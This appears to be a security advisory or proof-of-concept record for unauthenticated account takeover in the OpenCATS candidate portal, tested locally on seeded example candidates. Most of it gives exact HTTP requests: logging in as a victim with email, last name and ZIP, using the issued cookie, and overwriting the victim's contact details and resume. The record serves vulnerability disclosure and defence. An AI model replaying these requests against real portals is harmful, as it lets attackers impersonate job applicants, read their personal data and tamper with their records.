@@ -1,0 +1,103 @@
+OPENCATS-D2N1 — Unauthenticated candidate portal account takeover via low-entropy
+verification fields (email + last name + ZIP), no captcha / no rate limiting
+================================================================================
+Target        : OpenCATS 0.10.0 (master), public careers portal (careers/index.php)
+Code path     : modules/careers/CareersUI.php — isCandidateRegistered() L2080-2084,
+                ProcessCandidateRegistration() L2086-2178 (SQL match L2131-2160,
+                2-week identity cookie setcookie L2163-2170), profile render
+                p=registeredCandidateProfile L183-283, profile update
+                p=onRegisteredCandidateProfile L285-390 (Candidates::update L343-373,
+                resume delete+replace L374-386), registration login
+                subAction=processLogin L551-592.
+Prereq state  : careers portal enabled + candidateRegistration enabled (documented
+                operating mode; stock default template "CATS 2.0" defines exactly
+                email/lastName/zip as the registration fields — db/cats_schema.sql
+                L388). Victim candidates seeded as pre-existing applicants:
+                  candidate 1: Alice Smith   <alice.smith@example.com> zip 10001
+                  candidate 2: Bob Jones     <bob.jones@example.com>   zip 90210
+Environment   : PHP 8.4.26 (app requires >= 8.4.1), temp MySQL 8.0 on 127.0.0.1:3307,
+                php -S 127.0.0.1:8080. Local only.
+
+[1] Registration form (p=candidateRegistration&ID=1) renders the default template
+    fields — the "credentials" a first-time applicant supplies and any attacker
+    knows from the victim's resume:
+    HTTP 200; form contains: name="email", name="lastName", name="zip",
+    "I have registered before".
+
+[2] CONTROL — wrong ZIP (email+lastName correct, zip=99999):
+    POST /careers/index.php?m=careers&p=applyToJob&ID=1
+      applyToJobSubAction=processLogin&isNew=no
+      email=alice.smith@example.com&lastName=Smith&zip=99999&rememberMe=yes
+    -> HTTP 200, application form NOT pre-filled: 'value="Alice"' = 0 hits,
+       'Main Street' = 0 hits, no Set-Cookie cats1cw identity cookie.
+
+[3] ATTACK — correct low-entropy triple (email + lastName + ZIP):
+    POST /careers/index.php?m=careers&p=applyToJob&ID=1
+      applyToJobSubAction=processLogin&isNew=no
+      email=alice.smith@example.com&lastName=Smith&zip=10001&rememberMe=yes
+    -> HTTP 200, form PRE-FILLED WITH VICTIM'S FULL PII from the candidate record:
+         value="Alice"  value="Smith"  value="alice.smith@example.com"
+         value="1 Main Street"  value="555-0100" (work phone)
+         value="Acme Corp"  value="PHP; SQL"  value="10001"
+    -> hidden field discloses victim's candidate record ID:
+         name="candidateID" value="1"
+    -> 2-week identity cookie issued by ProcessCandidateRegistration (L2163-2170):
+         Set-Cookie: cats1cw=%22email%22%3D%22alice.smith%2540example.com%22
+                     %22lastName%22%3D%22Smith%22%22zip%22%3D%2210001%22;
+                     expires=+14d; Max-Age=1209600
+    DETERMINISM: repeated 5/5 with identical result (200 + prefill + cookie).
+
+[4] Victim isolation / enumeration resistance is nil:
+    - Candidate B's own triple (bob.jones@example.com / Jones / 90210) matches ONLY
+      Bob: prefill value="Bob", value="9 Elm Street", candidateID value="2".
+    - Cross combination (A's email + B's lastName + A's zip) matches NOTHING:
+      prefill value="Alice" = 0, value="Bob" = 0.
+    => the triple acts as a per-victim password; any insider/previous applicant
+       who knows a victim's email+lastName+ZIP logs in as that victim.
+
+[5] FULL ACCOUNT TAKEOVER with ONLY the cookie (no password anywhere in flow):
+    GET /careers/index.php?m=careers&p=showAll&pa=updateProfile   (Cookie: cats1cw=...)
+    -> HTTP 200 "My Profile" rendered from the VICTIM's record (Alice Smith,
+       alice.smith@example.com, 1 Main Street, 555-0100).
+
+[6] PII OVERWRITE as the victim:
+    POST /careers/index.php?m=careers&p=onRegisteredCandidateProfile  (Cookie: cats1cw=...)
+      firstName=Alice&lastName=Smith&email1=alice.smith@example.com
+      phoneHome=555-0101&phoneWork=666-PWNED&address=66 Attacker Lane
+      city=New York&state=NY&zip=10001&country=US
+      keySkills=PWNED by attacker&bestTimeToCall=Never&attachmentID=-1
+    -> HTTP 302 redirect to ...&pa=updateProfile&isPostBack=yes
+    -> DB before: phone_work=555-0100, address='1 Main Street',
+                  key_skills='PHP; SQL'
+       DB after : phone_work=666-PWNED, address='66 Attacker Lane',
+                  key_skills='PWNED by attacker', best_time_to_call='Never'
+    -> portal re-render of victim profile shows attacker-chosen values.
+
+[7] RESUME OVERWRITE as the victim:
+    Same endpoint, multipart upload file=attacker_resume_v1.txt:
+    -> attachment row created (data_item_id=1, DATA_ITEM_CANDIDATE),
+       original_filename=attacker_resume_v1.txt; profile page now renders
+       "ATTACKER-CONTROLLED RESUME v1" inside the victim's resume textarea.
+    Repeat with attachmentID=7 (the just-created attachment) and
+    file=attacker_resume_v2.txt — code path L374-386:
+       Attachments::delete($attachmentID) + AttachmentCreator::createFromFile(...)
+    -> old attachment deleted, replaced by attacker_resume_v2.txt;
+       profile page now renders "ATTACKER-CONTROLLED RESUME v2".
+    (Recruiter UI now shows attacker-chosen PII + resume under the victim.)
+
+[8] NO CAPTCHA on the takeover path: captcha is only enforced on the final job
+    application POST (p=onApplyToJobOrder) when the apply template contains
+    '<input-captcha req>' (careerPortalTemplateRequiresCaptcha L1169-1172). The
+    registration login (processLogin), profile view and profile update carry NO
+    captcha check.
+
+[9] NO RATE LIMITING / LOCKOUT: 20 consecutive wrong-ZIP login attempts from the
+    same client all returned HTTP 200, no lockout, no delay, no captcha challenge
+    (burst-200-responses=20/20).
+
+Impact summary: anyone knowing a victim candidate's email + last name + ZIP — all
+three routinely printed on the resume the victim already uploaded through this
+same portal — authenticates as that candidate (2-week cookie), reads the profile,
+overwrites PII and replaces the resume, and can enumerate other victims
+(candidateID disclosure). Cookie value itself re-exfiltrates the verification
+triple to the client.
